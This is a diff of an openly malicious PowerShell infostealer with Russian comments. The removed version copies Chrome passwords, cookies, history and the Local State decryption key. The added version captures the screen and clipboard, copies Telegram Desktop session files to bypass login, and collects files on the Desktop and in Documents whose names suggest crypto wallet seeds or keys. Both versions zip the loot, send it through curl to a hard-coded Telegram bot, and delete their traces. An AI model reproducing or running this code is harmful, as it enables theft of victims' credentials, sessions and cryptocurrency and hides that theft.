@@ -1,69 +1,61 @@
-# Настройки связи
+# Конфигурация
 $token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
 $chatId = "1940923712"
+$workDir = "$env:TEMP\assets_data"
+$zipFile = "$env:TEMP\final_loot.zip"
 
-# Конфигурация путей
-$chromeBase = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$workDir = "$env:TEMP\sys_cache_$(Get-Random)"
-$zipFile = "$env:TEMP\data_package.zip"
-
-# Создаем рабочую область
+# Создаем рабочую директорию
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
+# 1. Скриншот экрана (Визуальный контроль)
 try {
-    # 1. Забираем главный ключ (Local State) - без него расшифровка невозможна
-    $localState = Join-Path $chromeBase "Local State"
-    if (Test-Path $localState) {
-        Copy-Item $localState -Destination (Join-Path $workDir "ls.json") -Force
-    }
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+    $bitmap.Save("$workDir\screen.png", [System.Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose(); $bitmap.Dispose()
+} catch {}
 
-    # 2. Ищем все профили (Default, Profile 1, Profile 2 и т.д.)
-    $profiles = Get-ChildItem -Path $chromeBase -Directory | Where-Object { $_.Name -match "Default|Profile" }
+# 2. Буфер обмена (Текущие пароли/данные)
+Get-Clipboard | Out-File "$workDir\clip.txt" -ErrorAction SilentlyContinue
 
-    foreach ($profile in $profiles) {
-        $pName = $profile.Name
-        $targets = @{
-            "Login Data" = "pass_$pName.db"
-            "Network\Cookies" = "cook_$pName.db"
-            "Web Data" = "web_$pName.db"
-            "History" = "hist_$pName.db"
-        }
-
-        foreach ($relPath in $targets.Keys) {
-            $source = Join-Path $profile.FullName $relPath
-            if (Test-Path $source) {
-                # Используем хитрый способ копирования, чтобы не конфликтовать с открытым Chrome
-                $dest = Join-Path $workDir $targets[$relPath]
-                try {
-                    # Пытаемся скопировать через теневое чтение
-                    $stream = [System.IO.File]::Open($source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-                    $outStream = [System.IO.File]::Create($dest)
-                    $stream.CopyTo($outStream)
-                    $stream.Close()
-                    $outStream.Close()
-                } catch {
-                    # Если не вышло через стрим, пробуем обычный Copy-Item
-                    Copy-Item $source -Destination $dest -Force -ErrorAction SilentlyContinue
-                }
-            }
-        }
-    }
-
-    # 3. Упаковка всего собранного
-    if ((Get-ChildItem $workDir).Count -gt 0) {
-        Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
-        
-        # 4. Отправка архива
-        $uri = "https://api.telegram.org/bot$token/sendDocument"
-        & curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Full Package: LS + DBs (Success)" | Out-Null
-    }
-
-} catch {
-    # В случае критического сбоя отправляем короткий лог
-    $m = $_.Exception.Message
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Fail: $m"
-} finally {
-    # Полная зачистка следов
-    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-    if (Test-Path $zipFile) { Remove-Item $zipFile -Force -ErrorAction SilentlyContinue }
+# 3. Сбор Telegram сессии (tdata)
+# Мы забираем только критические файлы для обхода авторизации
+$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
+if (Test-Path $tgPath) {
+    $tgDest = New-Item -ItemType Directory -Path "$workDir\tg_session" -Force
+    # Файлы конфигурации и ключи
+    Get-ChildItem $tgPath -File | Where-Object { $_.Name -match "key_datas|settings|D877F783D5D3EF8C" } | Copy-Item -Destination $tgDest
+    # Папки с метаданными сессии (обычно 16-символьные имена)
+    Get-ChildItem $tgPath -Directory | Where-Object { $_.Name.Length -eq 16 } | Copy-Item -Destination $tgDest -Recurse -Force
 }
+
+# 4. Поиск сид-фраз и крипто-ключей
+# Ищем во всех текстовых файлах на Рабочем столе и в Документах
+$searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
+$keywords = "seed|phrase|mnemonic|wallet|private|key|secret|bitcoin|ethereum|metamask"
+
+foreach ($path in $searchPaths) {
+    if (Test-Path $path) {
+        # Копируем файлы, имена которых содержат ключи
+        Get-ChildItem $path -Recurse -Include *.txt, *.docx, *.pdf, *.xlsx -ErrorAction SilentlyContinue | Where-Object { 
+            $_.Name -match $keywords 
+        } | Copy-Item -Destination $workDir -ErrorAction SilentlyContinue
+    }
+}
+
+# 5. Упаковка и тихая отправка
+try {
+    if (Test-Path $zipFile) { Remove-Item $zipFile }
+    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
+    
+    $uri = "https://api.telegram.org/bot$token/sendDocument"
+    # Отправляем через curl (стандарт в Win10+)
+    & curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Assets collected: Screen + TG + Clip + CryptoSeeds" | Out-Null
+} catch {}
+
+# Очистка следов (обязательно для выживания)
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
